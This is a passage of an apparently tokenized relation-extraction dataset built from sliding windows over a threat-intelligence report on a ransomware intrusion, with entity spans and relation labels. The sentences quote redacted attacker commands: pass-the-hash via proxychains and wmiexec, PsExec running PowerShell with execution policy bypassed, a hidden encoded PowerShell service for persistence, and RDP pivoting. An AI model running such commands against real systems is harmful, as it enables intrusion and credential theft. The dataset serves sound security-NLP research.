"global_pos": [180, 180], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [191, 191], "name": "Windows service", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [252, 252], "name": "PowerShell", "pos": [18, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [261, 261], "name": "PowerShell instructions", "pos": [2, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [267, 267], "name": "PowerShell", "pos": [8, 9], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [289, 289], "name": "payload", "pos": [8, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [293, 293], "name": "server", "pos": [12, 13], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "RD", "evidence": [3, 4], "t": 9, "h": 11}, {"r": "ST", "evidence": [4, 5, 6, 7], "h": 11, "t": 16}, {"r": "RF", "evidence": [4, 5, 6, 7], "h": 11, "t": 16}, {"r": "EX", "evidence": [6], "t": 13, "h": 14}, {"r": "WR", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "EX", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "RF", "evidence": [6, 7], "h": 14, "t": 16}]}, {"title": "075-5", "sents": [["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attacker", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "proxychains", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "adversary", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [65, 65], "name": "Windows Batch files", "pos": [15, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [70, 70], "name": "PSExec", "pos": [20, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "PSExec", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "PowerShell", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [140, 140], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [151, 151], "name": "Windows service", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [212, 212], "name": "PowerShell", "pos": [18, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [221, 221], "name": "PowerShell instructions", "pos": [2, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [227, 227], "name": "PowerShell", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [249, 249], "name": "payload", "pos": [8, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [253, 253], "name": "server", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [261, 261], "name": "attacker", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [267, 267], "name": "environment", "pos": [12, 13], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 14}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "RD", "evidence": [2, 3], "t": 6, "h": 8}, {"r": "ST", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "RF", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "EX", "evidence": [5], "t": 10, "h": 11}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "EX", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "075-6", "sents": [["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "adversary", "pos": [13, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "Windows Batch files", "pos": [15, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "PSExec", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "PSExec", "pos": [4, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "PowerShell", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [90, 90], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [101, 101], "name": "Windows service", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [162, 162], "name": "PowerShell", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [171, 171], "name": "PowerShell instructions", "pos": [2, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [177, 177], "name": "PowerShell", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [199, 199], "name": "payload", "pos": [8, 9], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [203, 203], "name": "server", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [211, 211], "name": "attacker", "pos": [6, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [217, 217], "name": "environment", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [259, 259], "name": "attackers", "pos": [30, 31], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [263, 263], "name": "reconnaissance", "pos": [34, 35], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 7}, {"r": "RD", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "ST", "evidence": [2, 3, 4, 5], "h": 6, "t": 11}, {"r": "RF", "evidence": [2, 3, 4, 5], "h": 6, "t": 11}, {"r": "EX", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "EX", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "075-7", "sents": [["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "PSExec", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "PowerShell", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [68, 68], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [79, 79], "name": "Windows service", "pos": [1, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [140, 140], "name": "PowerShell", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [149, 149], "name": "PowerShell instructions", "pos": [2, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [155, 155], "name": "PowerShell", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [177, 177], "name": "payload", "pos": [8, 9], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [181, 181], "name": "server", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [189, 189], "name": "attacker", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [195, 195], "name": "environment", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [237, 237], "name": "attackers", "pos": [30, 31], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [241, 241], "name": "reconnaissance", "pos": [34, 35], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [283, 283], "name": "attacker", "pos": [7, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [290, 290], "name": "pivot", "pos": [14, 15], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "ST", "evidence": [1, 2, 3, 4], "h": 3, "t": 8}, {"r": "RF", "evidence": [1, 2, 3, 4], "h": 3, "t": 8}, {"r": "EX", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "EX", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "RF", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "FR", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 13}, {"r": "FR", "evidence": [6], "h": 11, "t": 12}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}]}, {"title": "075-8", "sents": [["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "Windows service", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [62, 62], "name": "PowerShell", "pos": [18, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "PowerShell instructions", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "PowerShell", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "payload", "pos": [8, 9], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [103, 103], "name": "server", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "attacker", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "environment", "pos": [12, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [159, 159], "name": "attackers", "pos": [30, 31], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "reconnaissance", "pos": [34, 35], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [205, 205], "name": "attacker", "pos": [7, 8], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [212, 212], "name": "pivot", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [238, 238], "name": "attacker", "pos": [18, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [243, 243], "name": "PowerShell scripts", "pos": [23, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [270, 270], "name": "adversaries", "pos": [50, 51], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [276, 276], "name": "PowerShell script", "pos": [56, 58], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "RF", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "EX", "evidence": [2], "t": 2, "h": 3}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "EX", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 6, "t": 10}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "FR", "evidence": [6], "h": 10, "t": 11}, {"r": "EX", "evidence": [7], "h": 12, "t": 13}, {"r": "RD", "evidence": [7], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "075-9", "sents": [["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "PowerShell", "pos": [18, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "PowerShell instructions", "pos": [2, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "PowerShell", "pos": [8, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "payload", "pos": [8, 9], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [59, 59], "name": "server", "pos": [12, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "attacker", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "environment", "pos": [12, 13], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "attackers", "pos": [30, 31], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "reconnaissance", "pos": [34, 35], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [161, 161], "name": "attacker", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [168, 168], "name": "pivot", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [194, 194], "name": "attacker", "pos": [18, 19], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "PowerShell scripts", "pos": [23, 25], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [226, 226], "name": "adversaries", "pos": [50, 51], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [232, 232], "name": "PowerShell script", "pos": [56, 58], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "FR", "evidence": [3], "h": 5, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4, 5], "h": 5, "t": 9}, {"r": "FR", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [5], "h": 9, "t": 10}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}]}, {"title": "075-10", "sents": [["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", 